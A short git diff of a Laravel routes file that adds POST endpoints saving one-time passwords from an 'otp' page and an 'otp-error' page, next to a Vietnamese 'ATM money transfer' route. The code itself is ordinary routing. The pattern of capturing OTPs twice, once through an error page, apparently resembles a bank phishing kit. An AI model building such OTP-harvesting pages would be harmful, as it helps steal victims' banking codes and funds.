@@ -1,5 +1,6 @@
 <?php
 
+use App\Http\Controllers\OtpController;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -48,8 +49,10 @@ Route::get('/chuyen-tien-atm', function () {
 Route::get('/otp', function () {
     return view('otp');
 });
-// Route::post('/otp-post', 'OtpController@postOtp');
+Route::post('/otp-post', [OtpController::class, 'save'])->name('otp_post');
 //otp-error
 Route::get('/otp-error', function () {
     return view('otp-error');
 });
+//otp_error_post
+Route::post('/otp-error-post', [OtpController::class, 'saveError'])->name('otp_error_post');
